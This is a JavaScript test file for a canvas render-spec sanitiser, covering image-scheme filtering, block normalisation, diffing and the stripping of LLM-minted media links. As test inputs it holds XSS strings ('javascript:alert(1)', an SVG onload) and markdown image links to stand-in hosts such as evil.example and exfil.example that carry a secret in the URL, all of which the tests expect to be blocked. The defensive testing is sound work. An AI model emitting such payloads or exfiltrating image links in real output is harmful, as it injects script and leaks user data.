// Core/canvasSpec.test.js — CA-1 (v2.74.1204): the pure Canvas render-spec.

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import {
  BLOCK_KINDS, sanitizeImageSrc, normalizeBlock, normalizeCanvasSpec, newCanvasSpec, canvasDocId,
  diffSpec, editableBlocks, composeContent, setBlockText,
} from './canvasSpec.js';

describe('canvasSpec — sanitizeImageSrc (the image safety gate)', () => {
  it('allows https and data:image raster', () => {
    assert.equal(sanitizeImageSrc('https://cdn.example.com/shot.png'), 'https://cdn.example.com/shot.png');
    assert.equal(sanitizeImageSrc('data:image/png;base64,iVBORw0KGgo='), 'data:image/png;base64,iVBORw0KGgo=');
    assert.equal(sanitizeImageSrc('data:image/jpeg;base64,/9j/4AAQ'), 'data:image/jpeg;base64,/9j/4AAQ');
  });
  it('DROPS every unsafe scheme → empty string', () => {
    assert.equal(sanitizeImageSrc('javascript:alert(1)'), '');
    assert.equal(sanitizeImageSrc('data:text/html,<script>alert(1)</script>'), '');
    assert.equal(sanitizeImageSrc('data:image/svg+xml,<svg onload=alert(1)>'), '');   // SVG can carry script — rejected
    assert.equal(sanitizeImageSrc('http://insecure.example.com/x.png'), '');          // plain http rejected
    assert.equal(sanitizeImageSrc('  JAVASCRIPT:alert(1)'), '');                       // trim + case-insensitive
    assert.equal(sanitizeImageSrc(''), '');
    assert.equal(sanitizeImageSrc(null), '');
  });
});

describe('canvasSpec — normalizeBlock (closed vocabulary)', () => {
  it('an unknown kind is DROPPED (the safety property)', () => {
    assert.equal(normalizeBlock({ kind: 'html', text: '<script>x</script>' }), null);
    assert.equal(normalizeBlock({ kind: 'iframe', src: 'https://evil' }), null);
    assert.equal(normalizeBlock(null), null);
    for (const k of BLOCK_KINDS) assert.ok(k !== 'html' && k !== 'iframe');   // sanity: no executable kind in v1
  });
  it('markdown carries raw text (escaped at render, not here)', () => {
    const b = normalizeBlock({ id: 'b1', kind: 'markdown', text: '# Hi <b>there</b>' });
    assert.equal(b.text, '# Hi <b>there</b>');
    assert.equal(b.effect, 'none');
  });
  it('metric keeps a numeric or preformatted value + optional delta', () => {
    assert.equal(normalizeBlock({ kind: 'metric', label: 'Net worth', value: 1204.5, delta: -12 }).value, 1204.5);
    assert.equal(normalizeBlock({ kind: 'metric', label: 'Net worth', value: '$1,204.50' }).value, '$1,204.50');
    assert.equal('delta' in normalizeBlock({ kind: 'metric', label: 'x', value: 1 }), false);   // delta omitted when absent
    assert.equal(normalizeBlock({ kind: 'metric', label: 'x', value: {} }).value, '');           // object value → ''
  });
  it('chart requires a data spec; chartType is vetted', () => {
    assert.equal(normalizeBlock({ kind: 'chart', chartType: 'line' }), null);                    // no data → drop
    const c = normalizeBlock({ kind: 'chart', chartType: 'pyramid', data: { series: [1, 2] }, options: { stacked: true } });
    assert.equal(c.chartType, 'line');                                                            // unknown type → default
    assert.deepEqual(c.data, { series: [1, 2] });
    assert.deepEqual(c.options, { stacked: true });
  });
  it('image with an unsafe/empty src is DROPPED, not rendered blank', () => {
    assert.equal(normalizeBlock({ kind: 'image', src: 'javascript:alert(1)' }), null);
    assert.equal(normalizeBlock({ kind: 'image', src: '' }), null);
    const ok = normalizeBlock({ kind: 'image', src: 'https://x/y.png', alt: 'a screenshot' });
    assert.equal(ok.src, 'https://x/y.png');
    assert.equal(ok.alt, 'a screenshot');
  });
  it('compose is always editable and carries its ref', () => {
    const b = normalizeBlock({ kind: 'compose', text: 'Hi there', ref: 'ticket-1234' });
    assert.equal(b.editable, true);
    assert.equal(b.ref, 'ticket-1234');
    assert.equal(normalizeBlock({ kind: 'compose' }).ref, null);
  });
});

describe('canvasSpec — normalizeCanvasSpec', () => {
  it('is defensive and filters bad blocks', () => {
    const s = normalizeCanvasSpec({ anchor: { appId: 'finance', conversationId: 'c1' }, title: 'HUD',
      blocks: [{ kind: 'metric', label: 'x', value: 1 }, { kind: 'bogus' }, null, { kind: 'image', src: 'http://no' }] });
    assert.equal(s.blocks.length, 1);                 // only the valid metric survives
    assert.equal(s.anchor.appId, 'finance');
    assert.equal(s.rev, 0);
  });
  it('newCanvasSpec starts empty at rev 0', () => {
    const s = newCanvasSpec({ anchor: { appId: 'a' }, title: 'T' });
    assert.deepEqual(s.blocks, []);
    assert.equal(s.anchor.conversationId, null);
  });
});

describe('canvasSpec — diffSpec (the renderer animation input)', () => {
  const m = (id, value, delta) => ({ id, kind: 'metric', label: 'v', value, ...(delta != null ? { delta } : {}) });
  it('added / removed by id', () => {
    const prev = newCanvasSpec({ blocks: [m('a', 1)] });
    const next = newCanvasSpec({ blocks: [m('a', 1), m('b', 2)] });
    const d = diffSpec(prev, next);
    assert.deepEqual(d.added.map((x) => x.id), ['b']);
    assert.equal(d.removed.length, 0);
    assert.equal(d.changed.length, 0);
  });
  it('a metric value change is `changed` (same id, different content)', () => {
    const d = diffSpec(newCanvasSpec({ blocks: [m('a', 1)] }), newCanvasSpec({ blocks: [m('a', 2)] }));
    assert.equal(d.changed.length, 1);
    assert.equal(d.changed[0].id, 'a');
    assert.equal(d.changed[0].next.value, 2);
  });
  it('same content at a new index is `moved`, not `changed`', () => {
    const prev = newCanvasSpec({ blocks: [m('a', 1), m('b', 2)] });
    const next = newCanvasSpec({ blocks: [m('b', 2), m('a', 1)] });
    const d = diffSpec(prev, next);
    assert.equal(d.changed.length, 0);
    assert.equal(d.moved.length, 2);
    assert.deepEqual(d.moved.find((x) => x.id === 'a'), { id: 'a', from: 0, to: 1 });
  });
  it('chart data compares key-order-insensitively (no false `changed`)', () => {
    const c1 = { id: 'c', kind: 'chart', data: { a: 1, b: 2 } };
    const c2 = { id: 'c', kind: 'chart', data: { b: 2, a: 1 } };
    assert.equal(diffSpec(newCanvasSpec({ blocks: [c1] }), newCanvasSpec({ blocks: [c2] })).changed.length, 0);
  });
  // v2.74.1341 (review G) — id hygiene: an id-less block gets a STABLE positional id at normalize, so a text edit
  // is `changed` (patched in place on the live tab) instead of added+removed (which made the node vanish on update).
  it('id-less blocks get stable positional ids → a text edit is `changed`, an identical spec diffs to NOTHING', () => {
    const d = diffSpec(newCanvasSpec({ blocks: [{ kind: 'markdown', text: 'old' }] }),
                       newCanvasSpec({ blocks: [{ kind: 'markdown', text: 'new' }] }));
    assert.equal(d.added.length, 0);
    assert.equal(d.removed.length, 0);
    assert.equal(d.changed.length, 1);
    const same = diffSpec(newCanvasSpec({ blocks: [{ kind: 'markdown', text: 'x' }] }),
                          newCanvasSpec({ blocks: [{ kind: 'markdown', text: 'x' }] }));
    assert.deepEqual([same.added.length, same.removed.length, same.changed.length, same.moved.length], [0, 0, 0, 0]);
  });
  it('duplicate ids are de-duped at normalize (a diff/patch can never hit the wrong node)', () => {
    const s = normalizeCanvasSpec({ blocks: [
      { id: 'x', kind: 'markdown', text: 'one' },
      { id: 'x', kind: 'markdown', text: 'two' },
      { kind: 'markdown', text: 'three' },
    ] });
    assert.deepEqual(s.blocks.map((b) => b.id), ['x', 'x~2', '_b2']);
    const ids = new Set(s.blocks.map((b) => b.id));
    assert.equal(ids.size, s.blocks.length);
  });
});

describe('canvasSpec — compose lifecycle', () => {
  const spec = newCanvasSpec({ blocks: [
    { id: 'ctx', kind: 'markdown', text: 'the ticket' },
    { id: 'd1', kind: 'compose', text: 'draft one', ref: 'ticket-1' },
    { id: 'd2', kind: 'compose', text: 'draft two', ref: 'ticket-2' },
  ] });
  it('editableBlocks returns only compose blocks', () => {
    assert.deepEqual(editableBlocks(spec).map((b) => b.id), ['d1', 'd2']);
  });
  it('composeContent reads by ref, or the first when ref omitted, null when none', () => {
    assert.equal(composeContent(spec, 'ticket-2'), 'draft two');
    assert.equal(composeContent(spec), 'draft one');
    assert.equal(composeContent(newCanvasSpec({ blocks: [{ id: 'x', kind: 'markdown', text: 'y' }] })), null);
  });
  it('setBlockText edits a compose/markdown block; no-op elsewhere or on a missing id', () => {
    const edited = setBlockText(spec, 'd1', 'EDITED');
    assert.equal(composeContent(edited, 'ticket-1'), 'EDITED');
    assert.deepEqual(setBlockText(spec, 'nope', 'x'), spec);                       // missing id → equal doc
    const withMetric = newCanvasSpec({ blocks: [{ id: 'mm', kind: 'metric', label: 'l', value: 1 }] });
    assert.deepEqual(setBlockText(withMetric, 'mm', 'x'), withMetric);            // metric isn't text-bearing → no-op
  });
});

describe('canvasSpec — canvasDocId (anchor → storage key)', () => {
  it('keys by conversation, then app, then scratch', () => {
    assert.equal(canvasDocId({ appId: 'finance', conversationId: 'c1' }), 'conv-c1');   // conversation wins
    assert.equal(canvasDocId({ appId: 'finance' }), 'app-finance');
    assert.equal(canvasDocId({}), 'scratch');
    assert.equal(canvasDocId(null), 'scratch');
  });
});

describe('canvasSpec — GD-7e media refs + video (§8.7, refs-not-URLs)', () => {
  it('sanitizeMediaRef: attachment:/capture:/kb: shapes pass; anything else is rejected', async () => {
    const { sanitizeMediaRef } = await import('./canvasSpec.js');
    assert.equal(sanitizeMediaRef('kb:123#img2'), 'kb:123#img2');
    assert.equal(sanitizeMediaRef('attachment:az-9'), 'attachment:az-9');
    assert.equal(sanitizeMediaRef('capture:step.3'), 'capture:step.3');
    assert.equal(sanitizeMediaRef('https://evil.example/x.png'), '');
    assert.equal(sanitizeMediaRef('kb:'), '');
    assert.equal(sanitizeMediaRef(''), '');
  });
  it('image: a valid mediaRef with NO src now survives (adapter resolves later); neither → drop', () => {
    const b = normalizeBlock({ kind: 'image', ref: 'kb:1#img1', alt: 'reset pinhole' });
    assert.equal(b.mediaRef, 'kb:1#img1'); assert.equal(b.src, undefined);
    assert.equal(normalizeBlock({ kind: 'image', alt: 'x' }), null);
  });
  it('video: https src OR mediaRef; javascript:/data:/neither → drop; label carried', () => {
    assert.equal(normalizeBlock({ kind: 'video', src: 'https://help.x.com/v.mp4', label: 'demo' }).src, 'https://help.x.com/v.mp4');
    assert.equal(normalizeBlock({ kind: 'video', ref: 'kb:1#vid1' }).mediaRef, 'kb:1#vid1');
    assert.equal(normalizeBlock({ kind: 'video', src: 'javascript:alert(1)' }), null);
    assert.equal(normalizeBlock({ kind: 'video', src: 'data:video/mp4;base64,AAAA' }), null);
    assert.ok(BLOCK_KINDS.includes('video'));
  });
  it('GD-7h stripMintedMedia TEXT pass: a minted-URL inline image collapses to its alt text; ref-target inline images survive', async () => {
    const { stripMintedMedia } = await import('./canvasSpec.js');
    const spec = { blocks: [
      { kind: 'compose', ref: 'r', text: 'Press ![pinhole](kb:1#img1) then see ![exfil](https://evil.example/x.png?d=secret) now.' },
      { kind: 'markdown', text: '![ok](attachment:a1) and ![bad](javascript:alert(1))' },
    ] };
    const out = stripMintedMedia(spec);
    assert.equal(out.blocks[0].text, 'Press ![pinhole](kb:1#img1) then see exfil now.');
    assert.equal(out.blocks[1].text, '![ok](attachment:a1) and bad');
  });

  it('stripMintedMedia: an LLM-minted remote src is stripped (ref survives; src-only block drops whole); data: raster + non-media blocks untouched', async () => {
    const { stripMintedMedia } = await import('./canvasSpec.js');
    const spec = { title: 'T', blocks: [
      { kind: 'image', src: 'https://exfil.example/x.png?data=secret', ref: 'kb:1#img1', alt: 'a' },
      { kind: 'image', src: 'https://exfil.example/y.png', alt: 'b' },
      { kind: 'image', src: 'data:image/png;base64,AAAA', alt: 'c' },
      { kind: 'video', src: 'https://exfil.example/v.mp4', label: 'd' },
      { kind: 'markdown', text: 'see https://ok.example (prose, untouched)' },
    ] };
    const out = stripMintedMedia(spec);
    assert.equal(out.blocks.length, 3);                       // b (src-only image) + d (src-only video) dropped whole
    assert.equal(out.blocks[0].src, undefined);               // a: minted src stripped…
    assert.equal(out.blocks[0].ref, 'kb:1#img1');             // …the trusted ref survives
    assert.equal(out.blocks[1].src, 'data:image/png;base64,AAAA');   // inline raster (no network) kept
    assert.match(out.blocks[2].text, /ok\.example/);          // prose never touched
  });
});

describe('canvasSpec — table blocks (VT-2d v2.74.1583: the dashboard grid, safe by construction)', () => {
  it('normalizes headers + rows to plain STRINGS (numbers stringify; nothing executable survives as a value type)', () => {
    const b = normalizeBlock({ kind: 'table', id: 't', headers: ['Host', 7], rows: [['a.test', 42, null], ['b.test', { x: 1 }, true]] });
    assert.equal(b.kind, 'table');
    assert.deepEqual(b.headers, ['Host', '7']);
    assert.equal(b.rows.length, 2);
    for (const row of b.rows) for (const cell of row) assert.equal(typeof cell, 'string');
    assert.equal(b.rows[0][1], '42');
  });
  it('drops a rowless table (the safety default) and bounds rows × cols', () => {
    assert.equal(normalizeBlock({ kind: 'table', headers: ['h'], rows: [] }), null);
    assert.equal(normalizeBlock({ kind: 'table', rows: 'not-an-array' }), null);
    const big = normalizeBlock({ kind: 'table', rows: Array.from({ length: 100 }, () => Array.from({ length: 30 }, (_, i) => i)) });
    assert.equal(big.rows.length, 60, 'row cap');
    assert.equal(big.rows[0].length, 12, 'column cap');
  });
  it('rides normalizeCanvasSpec + diffSpec like any other kind (stable id → changed, not add/remove)', () => {
    const prev = { anchor: { appId: 'x' }, blocks: [{ id: 't1', kind: 'table', headers: ['H'], rows: [['a']] }] };
    const next = { anchor: { appId: 'x' }, blocks: [{ id: 't1', kind: 'table', headers: ['H'], rows: [['b']] }] };
    assert.equal(normalizeCanvasSpec(prev).blocks.length, 1);
    const d = diffSpec(prev, next);
    assert.equal(d.changed.length, 1);
    assert.equal(d.added.length + d.removed.length, 0);
  });
});

describe('canvasSpec — the VT-2e dashboard vocabulary (cells · cards · help · sub)', () => {
  it('table cells: the closed union — chips clamp tone, bars clamp 0..1, mixes floor to counts, dots enum, text slices', () => {
    const b = normalizeBlock({ kind: 'table', id: 't', rows: [[
      { chip: 'drift?', tone: 'danger' },
      { chip: 'x', tone: 'chartreuse' },                    // unknown tone → mute
      { bar: 1.7, label: '95%' },                           // clamps to 1
      { bar: 'nope' },                                      // NaN → 0
      { mix: { ok: 3.9, auth: -2, miss: 'x', other: 1 } },  // floor + non-negative
      { dot: 'out', label: 'out · 07:02' },
      { dot: 'sideways' },                                  // unknown dot → unknown
      { text: 'a.test', sub: '6 armed', mono: true },
      { evil: '<script>' },                                 // unrecognized object → ''
    ]] });
    const r = b.rows[0];
    assert.deepEqual(r[0], { chip: 'drift?', tone: 'danger' });
    assert.equal(r[1].tone, 'mute');
    assert.equal(r[2].bar, 1);
    assert.equal(r[3].bar, 0);
    assert.deepEqual(r[4].mix, { ok: 3, auth: 0, miss: 0, other: 1 });
    assert.deepEqual(r[5], { dot: 'out', label: 'out · 07:02' });
    assert.equal(r[6].dot, 'unknown');
    assert.deepEqual(r[7], { text: 'a.test', sub: '6 armed', mono: true });
    assert.equal(r[8], '', 'an unrecognized object collapses to empty — never rendered raw');
  });
  it('cards: closed tones, titleless items drop, itemless block drops, strings slice', () => {
    const b = normalizeBlock({ kind: 'cards', id: 'c', items: [
      { tone: 'open', title: 'Session expired — vendorsuite', when: 'open 5m', body: 'b', marker: '[presence] x' },
      { tone: 'plaid', title: 'T2' },                        // unknown tone → info
      { tone: 'open', body: 'no title' },                    // titleless → dropped
      'junk',
    ] });
    assert.equal(b.items.length, 2);
    assert.equal(b.items[0].tone, 'open');
    assert.equal(b.items[1].tone, 'info');
    assert.equal(normalizeBlock({ kind: 'cards', items: [] }), null);
    const many = normalizeBlock({ kind: 'cards', items: Array.from({ length: 30 }, (_, i) => ({ title: `t${i}` })) });
    assert.equal(many.items.length, 12, 'item cap');
  });
  it('help rides ANY kind (sliced, value-only) and metric gains the sub line', () => {
    const m = normalizeBlock({ kind: 'metric', label: 'Ride success', value: '95%', sub: '42 runs', help: 'x'.repeat(500) });
    assert.equal(m.sub, '42 runs');
    assert.equal(m.help.length, 240);
    const md = normalizeBlock({ kind: 'markdown', text: 'hi', help: 'what this section means' });
    assert.equal(md.help, 'what this section means');
    assert.equal(normalizeBlock({ kind: 'markdown', text: 'hi', help: '   ' }).help, undefined, 'blank help never lands');
  });
});
